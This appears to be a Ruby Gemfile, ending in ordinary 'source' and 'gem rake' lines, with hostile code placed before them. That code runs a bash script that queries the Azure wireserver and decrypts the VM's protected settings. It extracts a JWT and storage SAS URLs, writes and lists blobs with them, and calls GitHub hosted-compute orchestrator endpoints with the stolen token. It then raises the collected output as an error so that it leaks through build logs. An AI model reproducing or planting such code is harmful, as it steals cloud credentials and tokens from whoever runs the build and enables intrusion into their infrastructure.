require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v114; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"

cat > extract_cert_url.py <<'PYEOF'
import re, html
s = open('gs.xml').read()
m = re.search(r'<Certificates>([^<]+)</Certificates>', s)
print(html.unescape(m.group(1)) if m else '')
PYEOF
CERT_URL=$(python3 extract_cert_url.py)

openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_NM=$(grep -v '^-----' cert.pem | tr -d '\n')
curl -sf -m 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_NM" -o cert-resp.xml "$CERT_URL"

cat > extract_cms.py <<'PYEOF'
import re
s = open('cert-resp.xml').read()
m = re.search(r'<Data>([^<]+)</Data>', s)
b = (m.group(1) if m else '').replace('\r','').replace('\n','').replace(' ','')
open('cms.b64','w').write(b)
PYEOF
python3 extract_cms.py
base64 -d < cms.b64 > cms.der 2>/dev/null
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>/dev/null
openssl pkcs12 -in decrypted.p7b -out vm.pem -password pass: -nodes 2>/dev/null

curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
cat > extract_ps.py <<'PYEOF'
import json
d = json.load(open('vm.json'))
print(d['extensionGoalStates'][0]['settings'][0]['protectedSettings'])
PYEOF
python3 extract_ps.py > ps.b64
base64 -d < ps.b64 > ps.der 2>/dev/null
openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null

cat > extract_bs.py <<'PYEOF'
import json, sys
d = json.load(open('ps.json'))
sys.stdout.write(d.get('script',''))
PYEOF
python3 extract_bs.py | base64 -d > bs.sh 2>/dev/null

JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"

cat > read_rbf.py <<'PYEOF'
import json, sys
d = json.load(sys.stdin)
print(d.get('iat',0), d.get('rbf',0))
PYEOF
TIMING=$(echo "$PAY" | base64 -d 2>/dev/null | python3 read_rbf.py)
IAT=$(echo $TIMING | awk '{print $1}')
RBF=$(echo $TIMING | awk '{print $2}')
NOW=$(date +%s)
WAIT=$((RBF - NOW + 15))
echo "STEP_JWT_TIMING iat=$IAT rbf=$RBF now=$NOW wait=$WAIT"
[ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 800 ] && sleep $WAIT

NOW2=$(date +%s)
echo "STEP_POST_WAIT_NOW=$NOW2 post_rbf=$((NOW2 - RBF))"

cat > extract_sas.py <<'PYEOF'
import re
text = open('bs.sh').read()
patterns = re.findall(r'https://hcrp[^"\s\\]+(?:\\u0026[^"\s\\]+)+', text)
for p in patterns:
    decoded = p.replace('\\u0026', '&')
    print(decoded)
PYEOF
python3 extract_sas.py > sas_urls.txt
echo "STEP_SAS_COUNT=$(wc -l < sas_urls.txt)"
head -3 sas_urls.txt | head -c 600
echo ""

DIAG_SAS=$(grep -E 'hcrpprodeus0[12]diag' sas_urls.txt | head -1)
echo "STEP_DIAG_SAS_PREVIEW=$(echo "$DIAG_SAS" | head -c 180)"

if [ -n "$DIAG_SAS" ]; then
  cat > parse_sas.py <<'PYEOF'
import sys, urllib.parse
url = sys.stdin.read().strip()
u = urllib.parse.urlparse(url)
print(u.scheme + '://' + u.netloc + u.path)
print(u.query)
print(u.netloc)
PYEOF
  PARSED=$(echo "$DIAG_SAS" | python3 parse_sas.py)
  CONTAINER_PATH=$(echo "$PARSED" | sed -n '1p')
  QUERY=$(echo "$PARSED" | sed -n '2p')
  STORAGE_ACCT=$(echo "$PARSED" | sed -n '3p')
  echo "STEP_CONTAINER_PATH=$CONTAINER_PATH"
  echo "STEP_STORAGE_ACCT=$STORAGE_ACCT"

  PROBE_NAME="benty-probe-$(date +%s)"
  WRITE_URL="${CONTAINER_PATH}/${PROBE_NAME}?${QUERY}"
  PROBE_MARK="BENTY-PROBE-MARK-F023-CHAIN-$(date +%Y%m%d-%H%M%S)"

  echo "STEP_SAS_PUT:"
  curl -s -m 15 -X PUT -H "x-ms-blob-type: BlockBlob" -H "x-ms-version: 2020-04-08" --data-binary "$PROBE_MARK" -o put_resp.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$WRITE_URL"
  echo "STEP_PUT_BODY_B64=$(base64 -w0 < put_resp.txt | head -c 400)"

  echo "STEP_SAS_READ:"
  curl -s -m 15 -X GET -o read_resp.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$WRITE_URL"
  echo "STEP_READ_BODY_B64=$(base64 -w0 < read_resp.txt | head -c 400)"

  ANON_LIST_URL="https://${STORAGE_ACCT}/?comp=list"
  echo "STEP_ANON_LIST_TEST"
  curl -s -m 10 -o anon_list.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$ANON_LIST_URL"
  echo "STEP_ANON_LIST_B64=$(base64 -w0 < anon_list.txt | head -c 400)"

  SAS_LIST_URL="https://${STORAGE_ACCT}/?comp=list&${QUERY}"
  echo "STEP_SAS_LIST_TEST"
  curl -s -m 10 -o sas_list.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$SAS_LIST_URL"
  echo "STEP_SAS_LIST_B64=$(base64 -w0 < sas_list.txt | head -c 400)"

  CONT_LIST_URL="${CONTAINER_PATH}?restype=container&comp=list&${QUERY}"
  echo "STEP_CONT_LIST_TEST"
  curl -s -m 10 -o cont_list.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$CONT_LIST_URL"
  echo "STEP_CONT_LIST_B64=$(base64 -w0 < cont_list.txt | head -c 400)"
fi

if [ -n "$JWT" ]; then
  HOST="hosted-compute-request-orchestrator-prod-eus-02.githubapp.com"
  for ep in /v1/work /v1/register /v1/registrations /v1/poll /v1/lease /v1/agents; do
    for method in GET POST; do
      curl -s -m 8 -X "$method" -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{}' -o body.txt -w "$ep $method HTTP=%{http_code} LEN=%{size_download}\n" "https://$HOST$ep"
      echo "STEP_ORCH $ep $method body_b64=$(base64 -w0 < body.txt | head -c 400)"
    done
  done

  HOST2="hosted-compute-request-orchestrator-prod-wcus-02.githubapp.com"
  for ep in /v1/work /v1/register / /v1/health; do
    curl -s -m 8 -H "Authorization: Bearer $JWT" -o body2.txt -w "HOST2 $ep HTTP=%{http_code} LEN=%{size_download}\n" "https://$HOST2$ep"
    echo "STEP_HOST2 $ep body_b64=$(base64 -w0 < body2.txt | head -c 400)"
  done
fi
SHELL
Tempfile.create('v114.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v114 " + line.chomp[0..900] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
